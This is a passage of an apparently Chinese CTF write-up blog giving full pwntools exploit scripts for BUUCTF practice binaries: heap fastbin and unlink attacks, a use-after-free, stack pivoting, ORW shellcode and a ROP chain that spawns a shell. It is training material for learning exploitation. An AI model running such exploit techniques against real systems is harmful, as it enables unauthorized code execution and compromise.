class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment">#p = process(&quot;./babyheap&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27332</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allo</span>(<span class="hljs-params">size</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx,size,content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Command: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>allo(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)             <span class="hljs-comment">#chunk2 fd指针指向4号位置，chunk1不在fastbin</span><br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload),payload)             <span class="hljs-comment">#chunk4大小改为0x21，chunk4 在fastbin</span><br><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1重新得到chunk2</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2得到chunk4 0x21</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload),payload)           <span class="hljs-comment">#chunk4大小改为0x91  fastbin</span><br>allo(<span class="hljs-number">0x80</span>)                          <span class="hljs-comment">#防止free 4 与top chunk合并</span><br>free(<span class="hljs-number">4</span>)                            <span class="hljs-comment">#chunk4 加入unsortbin</span><br>dump(<span class="hljs-number">2</span>)<br>content = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)    <span class="hljs-comment">#得到main_arena + 0x58地址</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(content))<br>libc_base = (content) - <span class="hljs-number">0x3c4b78</span>                 <span class="hljs-comment">#lib加载基地址</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>allo(<span class="hljs-number">0x60</span>)         <span class="hljs-comment">#切割new chunk4 = 0x60，index4                                </span><br>free(<span class="hljs-number">4</span>)            <span class="hljs-comment">#free index4</span><br>payload = p64(libc_base + <span class="hljs-number">0x3C4AED</span>)<br>fill(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)             <span class="hljs-comment">#fake chunk 加入fastbin</span><br><br>allo(<span class="hljs-number">0x60</span>)                  <span class="hljs-comment">#申请到 new chunk4，index5</span><br>allo(<span class="hljs-number">0x60</span>)                  <span class="hljs-comment">#申请得到 fake chunk.index6</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>)<br>payload += p64(libc_base+<span class="hljs-number">0x4526a</span>)         <br>fill(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(payload),payload)          <span class="hljs-comment">#将malloc_hook改为one_gadget</span><br>allo(<span class="hljs-number">20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h3><p>栈溢出rop</p><img src="image-20230414153152436.png" alt="image-20230414153152436" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29156</span>)<br><span class="hljs-comment">#p = process(&quot;./ez&quot;)</span><br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>payload = <span class="hljs-string">b&#x27;crashme\x00&#x27;</span>+<span class="hljs-string">b&#x27;M&#x27;</span>*<span class="hljs-number">0x12</span> + p32(stack_addr-<span class="hljs-number">0x1c</span>) + asm(shellcraft.sh())<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h3><h4 id="ORW、seccomp"><a href="#ORW、seccomp" class="headerlink" title="ORW、seccomp"></a>ORW、seccomp</h4><p>ORW类题目是指程序开了沙箱保护，禁用了一些函数的调用（如 execve等），使得我们并不能正常get shell，只能通过<code>ROP</code>的方式调用<code>open</code>, <code>read</code>, <code>write</code>的来读取并打印<code>flag</code>内容。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">seccomp</span> 是 secure computing 的缩写，其是 Linux kernel 从<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">23</span>版本引入的一种简洁的 sandboxing 机制。主要功能是限制直接通过syscall去调用某些系统函数。最初，Seccomp 只允许使用read、 write、_exit、sigreturn <span class="hljs-number">4</span>个系统调用，一旦调用其他系统调用时，内核就会发送 SIGKILL 信号终止进程。<br><span class="hljs-attribute">seccomp</span>是通过prctl系统调用来进行设置的<br></code></pre></td></tr></table></figure><p>安装<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看seccomp。使用apt-get安装ruby版本太低可能导致安装失败，建议从<a href="https://www.ruby-lang.org/en/downloads/">ruby官网</a>编译安装。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -zxvf ruby-3.0.0.tar<br>cd ruby-3.0.0<br>sudo ./configure<br>sudo make<br>sudo make install<br><br>sudo gem install seccomp-tools<br><span class="hljs-meta prompt_">#</span><span class="language-bash">sudo gem install one_gadget</span><br>seccomp-tools dump ./orw<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./orw&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28070</span>)<br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<br>shellcode = asm(shellcode)<br>p.recvuntil(<span class="hljs-string">&quot;shellcode&quot;</span>)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h3><h4 id="栈迁移-1"><a href="#栈迁移-1" class="headerlink" title="栈迁移"></a>栈迁移</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./spwn&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28097</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./spwn&#x27;</span>)<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#write_plt=0x08048380</span><br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;What is your name?&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(<span class="hljs-number">0x8048513</span>)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>))<br>p.recvuntil(<span class="hljs-string">&quot;What do you want to say?&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(<span class="hljs-number">0x0804A300</span>)+p32(<span class="hljs-number">0x08048408</span>))           <span class="hljs-comment">#要用send，sendline会多一个‘\n’,write只接受0x20</span><br>write_addr=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-built_in">hex</span>(write_addr))<br><br>libc =LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br>libcbase=write_addr-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system=libcbase+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>sh=libcbase+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>log.info(<span class="hljs-built_in">hex</span>(system))<br>log.info(<span class="hljs-built_in">hex</span>(sh))<br><br>p.recvuntil(<span class="hljs-string">&quot;What is your name?&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(sh))<br>p.recvuntil(<span class="hljs-string">&quot;What do you want to say?&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(<span class="hljs-number">0x0804A300</span>)+p32(<span class="hljs-number">0x08048408</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h3><h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./easyheap&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26555</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./easyheap&#x27;</span>)<br>heaparray=<span class="hljs-number">0x6020E0</span><br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system_plt=elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">creat</span>(<span class="hljs-params">size,content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Size of Heap :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    p.sendline(content)                 <span class="hljs-comment">#context不要加str()</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br>creat(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>creat(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>creat(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><span class="hljs-comment">#构造fake chunk</span><br>palyload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)+p64(heaparray-<span class="hljs-number">0x18</span>)+p64(heaparray-<span class="hljs-number">0x10</span>)<br>palyload=palyload.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>palyload+=p64(<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,palyload)<br><span class="hljs-comment">#free chunk1，发生unlink</span><br>dele(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#修改free的got表地址为system</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(free_got))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>dele(<span class="hljs-number">2</span>)   <span class="hljs-comment">#free(2)执行执行system(&#x27;/bin/sh&#x27;)</span><br>p.interactive() <br></code></pre></td></tr></table></figure><h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26320)</span><br>p=process(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">idx</span>):<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)          <span class="hljs-comment">#chunk0  0x10、chunk1 0x40</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)          <span class="hljs-comment">#chunk2  0x10、chunk3 0x40</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)              <span class="hljs-comment">#fastbin 0x10 存在chunk2、0</span><br>add(<span class="hljs-number">8</span>,p32(shell_addr))          <span class="hljs-comment">#申请到chunk2、0，向chunk0 put位置写入shell_addr</span><br>printf(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h3><p>静态编译不需要调用libc，gets()没有限制长度，找到可以一键getshell的rop片段组合加上偏移即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary rop --ropchain<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,26942)</span><br><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment"># Padding goes here</span><br>p = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">b&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">b&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br><br>r.sendline(p)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 